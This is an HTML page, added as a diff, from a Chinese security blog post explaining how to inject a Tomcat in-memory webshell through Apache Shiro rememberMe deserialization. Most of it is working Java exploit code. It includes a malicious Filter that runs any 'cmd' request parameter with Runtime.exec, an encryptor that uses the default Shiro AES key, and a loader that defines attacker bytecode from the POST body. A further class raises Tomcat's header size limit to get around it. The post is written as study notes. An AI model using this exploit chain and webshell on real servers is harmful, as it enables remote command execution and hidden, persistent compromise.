@@ -1,0 +1,487 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Shiro反序列化注入内存马 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Shiro反序列化注入内存马 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+之前学习了shiro反序列化以及Tomcat和Spring的一些内存马，但是一直没有把两者结合进行利用，今天来学习如何通过shiro反序列化注入内存马，这里其实我是先尝试了很久才写的文章，提前预告一下我踩了很久的坑，在注入内存马的时候..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Shiro反序列化注入内存马
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>之前学习了shiro反序列化以及Tomcat和Spring的一些内存马，但是一直没有把两者结合进行利用，今天来学习如何通过shiro反序列化注入内存马，这里其实我是先尝试了很久才写的文章，提前预告一下我踩了很久的坑，在注入内存马的时候我这里一直注入不了，但是同样的方式在别的师傅那能注入成功，我到现在也没搞明白。</p>
+<h1 id="shiro反序列化注入内存马">Shiro反序列化注入内存马</h1>
+<p>之前在学内存马的时候是知道动态注册一个Filter，但是当时是通过jsp去动态注册Filter，但是使用反序列化去注入内存马确实没怎么仔细想，今天准备学习的时候看到师傅们的Exp，其实就明白了，就是通过TemplatesImpl去加载恶意类，然后把动态注册Filter的代码写在反序列化的类的static方法中。这里的话内存马的内容就不说了，想看的师傅可以看之前的笔记。这里我也用了P牛的环境，项目代码地址：https://github.com/phith0n/JavaThings。因为有最大请求头的长度限制，所以我们需要在Tomcat的/conf/server.xml中进行如下修改，添加一个<code>maxHttpHeaderSize=&quot;40960000&quot;</code>即可。</p>
+<pre><code>    &lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;
+               connectionTimeout=&quot;20000&quot;
+               redirectPort=&quot;8443&quot; maxHttpHeaderSize=&quot;40960000&quot;/&gt;
+</code></pre>
+<p>直接使用P牛的shiroattack里的CommonsBeanutils1Shiro这条链，注入内存马的话，我们需要自己构造一个内存马。因为他要使用CommonsBeanutils1Shiro这条链，被TemplatesImpl类加载，需要继承AbstractTranslet类，我们也同时可以让他实现Filter接口，变成一个恶意的Filter</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.io.IOException;
+import javax.servlet.*;
+
+public class DemoFilter extends AbstractTranslet implements Filter {
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+}
+</code></pre>
+<p>我们可以在他的static部分完成注册Filter的操作，在doFilter中写入命令执行的功能，其实这个内存马和之前的jsp的内存马不同的地方就是，我们需要用另外一种方式来获取到standardContext，具体的姿势可以学习https://xz.aliyun.com/t/9914。这里就直接给出使用的内存马</p>
+<pre><code class="language-java">package com.govuln.shiroattack;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import java.io.Serializable;
+import java.lang.reflect.Field;
+import org.apache.catalina.core.StandardContext;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Map;
+import java.io.IOException;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+import java.lang.reflect.Constructor;
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.Context;
+import javax.servlet.*;
+
+public class BehinderFilter extends AbstractTranslet implements Filter {
+    static {
+        try {
+            final String name = &quot;evil&quot;;
+            final String URLPattern = &quot;/*&quot;;
+            //获取上下文
+            WebappClassLoaderBase webappClassLoaderBase =
+                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+
+            Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+            Configs.setAccessible(true);
+            Map filterConfigs = (Map) Configs.get(standardContext);
+
+            BehinderFilter behinderFilter = new BehinderFilter();
+
+            FilterDef filterDef = new FilterDef();
+            filterDef.setFilter(behinderFilter);
+            filterDef.setFilterName(name);
+            filterDef.setFilterClass(behinderFilter.getClass().getName());
+            /**
+             * 将filterDef添加到filterDefs中
+             */
+            standardContext.addFilterDef(filterDef);
+
+            FilterMap filterMap = new FilterMap();
+            filterMap.addURLPattern(URLPattern);
+            filterMap.setFilterName(name);
+            filterMap.setDispatcher(DispatcherType.REQUEST.name());
+
+            standardContext.addFilterMapBefore(filterMap);
+
+            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+            constructor.setAccessible(true);
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+
+            filterConfigs.put(name, filterConfig);
+            System.out.println(filterConfigs);
+        } catch (NoSuchFieldException ex) {
+            ex.printStackTrace();
+        } catch (InvocationTargetException ex) {
+            ex.printStackTrace();
+        } catch (IllegalAccessException ex) {
+            ex.printStackTrace();
+        } catch (NoSuchMethodException ex) {
+            ex.printStackTrace();
+        } catch (InstantiationException ex) {
+            ex.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        System.out.println(&quot;Do Filter ......&quot;);
+        String cmd;
+        if ((cmd = servletRequest.getParameter(&quot;cmd&quot;)) != null) {
+            Process process = Runtime.getRuntime().exec(cmd);
+            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
+                    new java.io.InputStreamReader(process.getInputStream()));
+            StringBuilder stringBuilder = new StringBuilder();
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                stringBuilder.append(line + '\n');
+            }
+            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+            servletResponse.getOutputStream().flush();
+            servletResponse.getOutputStream().close();
+            return;
+        }
+
+        filterChain.doFilter(servletRequest, servletResponse);
+        System.out.println(&quot;doFilter&quot;);
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+}
+</code></pre>
+<p>弄完对应的内存马，我们需要获得经过shiro的key通过aes加密并且base64编码后的结果，这里可以参照p牛的shiroattack里的Client去写，通过javassist读取一个类的class，然后对他进行加密编码后进行输出</p>
+<pre><code class="language-java">import com.govuln.shiroattack.CommonsBeanutils1Shiro;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+
+public class Exp {
+    public static void main(String[] args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(com.govuln.shiroattack.BehinderFilter.class.getName());
+        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());
+        AesCipherService aes = new AesCipherService();
+        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+    }
+}
+</code></pre>
+<p>这里有个小坑:需要在pom文件中添加如下包</p>
+<pre><code>&lt;dependency&gt;
+  &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+  &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+  &lt;version&gt;3.27.0-GA&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>然后运行Exp类即可得到对应的rememberMe的值，传入即可注入内存马，因为这里我本地打了两天也没打出来，估计是哪里存在点问题，但是相同的打法我在Le1a师傅那可以成功完成注入，这里就直接上在Le1a师傅那注入成功的截图了<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220508145619923.png" alt="image-20220508145619923" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220508145656129.png" alt="image-20220508145656129" loading="lazy"></figure>
+<h1 id="绕过请求头长度限制注入内存马">绕过请求头长度限制注入内存马</h1>
+<p>上面说到注入内存马是修改了Tomcat的最大请求头才能注入成功，正常情况下注入内存马是会爆400状态码的，所以在实战中我们需要绕过这个长度限制，达到注入内存马的目的。下面就来学习一下。主要绕过方法应该有三种</p>
+<ul>
+<li>修改maxHTTPHeaderSize</li>
+<li>反序列化一个加载器，从POST请求体中发送恶意字节码</li>
+<li>class bytes使用gzip+base64压缩编码</li>
+</ul>
+<p>实验环境:https://github.com/yyhuni/shiroMemshell/tree/master/springboot-shiro</p>
+<p>主要来看看第二种吧。比较推荐第二种方法，就是在post请求体中发送加密编码后的恶意Filter。因此我们这里要获取到request，response和session，还需要一个参数，把字节码传入然后调用defineClass动态加载此类。</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class MyClassLoader extends AbstractTranslet {
+    static{
+        try{
+            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();
+            java.lang.reflect.Field r=request.getClass().getDeclaredField(&quot;request&quot;);
+            r.setAccessible(true);
+            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();
+            javax.servlet.http.HttpSession session = request.getSession();
+
+            String classData=request.getParameter(&quot;classData&quot;);
+
+            byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
+            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,new Class[]{byte[].class, int.class, int.class});
+            defineClassMethod.setAccessible(true);
+            Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length);
+            cc.newInstance().equals(new Object[]{request,response,session});
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+    @Override
+    public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
+    }
+    @Override
+    public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {
+    }
+}
+</code></pre>
+<p>然后还是使用Exp生成rememberMe的值<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220508202827999.png" alt="image-20220508202827999" loading="lazy"></p>
+<p>然后把生成恶意类的base64编码，即可完成注入内存马</p>
+<pre><code>cat BehinderFilter.class|base64 |sed ':label;N;s/\n//;b label'
+</code></pre>
+<p>由于我本地注入内存马有问题，这里就弹个计算器证明可行</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220508202939582.png" alt="image-20220508202939582" loading="lazy"></figure>
+<p>关于修改请求头长度来进行绕过，我本地并没有复现成功，这里也把别的师傅的代码贴一下吧，以便于我自己后续进行学习</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+@SuppressWarnings(&quot;all&quot;)
+public class TomcatHeaderSize extends AbstractTranslet {
+
+    static {
+        try {
+            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(&quot;context&quot;);
+            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(&quot;service&quot;);
+            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(&quot;req&quot;);
+            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(&quot;headerBufferSize&quot;);
+            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(&quot;getHandler&quot;,null);
+            contextField.setAccessible(true);
+            headerSizeField.setAccessible(true);
+            serviceField.setAccessible(true);
+            requestField.setAccessible(true);
+            getHandlerMethod.setAccessible(true);
+            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
+                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
+            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
+            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
+            for (int i = 0; i &lt; connectors.length; i++) {
+                if (4 == connectors[i].getScheme().length()) {
+                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
+                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {
+                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();
+                        for (int j = 0; j &lt; classes.length; j++) {
+                        // org.apache.coyote.AbstractProtocol$ConnectionHandler
+                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {
+                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(&quot;global&quot;);
+                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(&quot;processors&quot;);
+                                globalField.setAccessible(true);
+                                processorsField.setAccessible(true);
+                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));
+                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
+                                for (int k = 0; k &lt; list.size(); k++) {
+                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));
+                                  // 10000 为修改后的 headersize 
+                                    headerSizeField.set(tempRequest.getInputBuffer(),10000);
+                                }
+                            }
+                        }
+                         // 10000 为修改后的 headersize 
+                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(10000);
+                    }
+                }
+            }
+        } catch (Exception e) {
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<h1 id="参考">参考</h1>
+<p>https://xz.aliyun.com/t/9914</p>
+<p>https://xz.aliyun.com/t/7388#toc-2</p>
+<p>https://xz.aliyun.com/t/10696#toc-2</p>
+<p>http://wjlshare.com/archives/1545</p>
+<p>https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8A%E8%BD%BDreGeorg%E4%BB%A3%E7%90%86</p>
+<p>https://xz.aliyun.com/t/9914#toc-3</p>
+<p>https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%94%B9%E9%80%A0reGeorg</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC">Shiro反序列化注入内存马</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC">绕过请求头长度限制注入内存马</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/shiro-550-fan-xu-lie-hua/">
+              <h3 class="post-title">
+                Shiro-550反序列化
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
